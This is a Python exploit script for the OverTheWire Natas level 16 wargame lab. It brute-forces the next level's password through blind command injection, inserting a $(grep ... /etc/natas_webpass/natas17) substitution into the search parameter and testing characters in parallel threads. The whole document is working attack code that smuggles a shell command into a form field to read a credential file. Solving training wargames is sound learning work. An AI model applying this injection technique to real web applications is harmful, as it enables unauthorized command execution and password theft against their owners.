import requests
import string
import concurrent.futures

URL = "http://natas16.natas.labs.overthewire.org/index.php"
AUTH_HEADER = {
    "Authorization": "your_token"
}
KEYWORD = "Africans"
PASSWORD = [""]  
MAX_THREADS = 20  

def test_character(char, position):
    payload = f"{KEYWORD}$(grep -o ^{PASSWORD[0]}{char} /etc/natas_webpass/natas17)"
    res = requests.get(URL, params={"needle": payload}, headers=AUTH_HEADER)
    print(f"[*] Testing {char} at position {position}")
    if KEYWORD not in res.text:
        PASSWORD[0] += char
        print(f"[+] Found character {position}: {char} -> Current password: {PASSWORD[0]}")
        return True
    return False

for i in range(32):
    found = False
    with concurrent.futures.ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
        future_to_char = {executor.submit(test_character, char, i): char for char in string.ascii_letters + string.digits}
        for future in concurrent.futures.as_completed(future_to_char):
            if future.result():
                found = True
                break 

print(f"[+] Final password: {PASSWORD[0]}")

